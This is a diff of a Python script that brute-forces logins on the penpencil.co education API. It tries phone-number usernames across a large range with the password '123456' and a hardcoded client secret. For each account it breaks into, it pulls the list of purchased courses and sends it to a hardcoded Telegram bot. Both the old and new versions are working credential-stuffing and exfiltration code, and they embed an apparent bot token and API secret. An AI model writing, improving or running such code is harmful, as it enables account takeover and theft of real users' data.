@@ -1,6 +1,35 @@
 import requests
-requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text=Started')
-def getBs(token):
+import asyncio
+
+async def get_batches_and_send_message(number):
+    headers = {
+        'Authorization': 'Bearer',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'client-id': '5eb393ee95fab7468a79d189',
+    }
+    json_data = {
+        'password': '123456',
+        'client_id': 'system-admin',
+        'client_secret': 'KjPXuAVfC5xbmgreETNMaL7z',
+        'grant_type': 'password',
+        'organizationId': '5eb393ee95fab7468a79d189',
+        'latitude': 0,
+        'longitude': 0,
+    }
+    
+    while number != 8000000000:
+        json_data['username'] = str(number)
+        response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
+        
+        if response.status_code == 200:
+            token = response.json()['data']['access_token']
+            batches = await getBs(token)
+            message = str(number) + str(batches)
+            send_telegram_message(message)
+        number -= 1
+
+async def getBs(token):
     url = 'https://api.penpencil.co/v3/batches/all-purchased-batches?page=1&mode=1&sort=TAG_LIST'
     headers = {
         'Host': 'api.penpencil.co',
@@ -14,31 +43,18 @@ def getBs(token):
     }
 
     response = requests.get(url, headers=headers)
-    batches=[]
-    data=response.json()['data']
-    for i in data:
-        batches.append(i['batch']['name'])
+    batches = []
+    
+    if response.status_code == 200:
+        data = response.json()['data']
+        for i in data:
+            batches.append(i['batch']['name'])
+    
     return batches
-headers = {
-    'Authorization': 'Bearer',
-    'Content-Type': 'application/json',
-    'Accept': 'application/json, text/plain, */*',
-    'client-id': '5eb393ee95fab7468a79d189',
-}
-json_data = {
-    'password': '123456',
-    'client_id': 'system-admin',
-    'client_secret': 'KjPXuAVfC5xbmgreETNMaL7z',
-    'grant_type': 'password',
-    'organizationId': '5eb393ee95fab7468a79d189',
-    'latitude': 0,
-    'longitude': 0,
-}
-number = 8482999999
-while number!=8000000000:
-    json_data['username']=str(number)
-    response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
-    if (response.json())['success']:
-        token=response.json()['data']['access_token']
-        requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+str(number)+str(getBs(token)))
-    number-=1
+
+def send_telegram_message(message):
+    telegram_url = 'https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text=' + message
+    requests.get(telegram_url)
+
+loop = asyncio.get_event_loop()
+loop.run_until_complete(get_batches_and_send_message(8482999999))
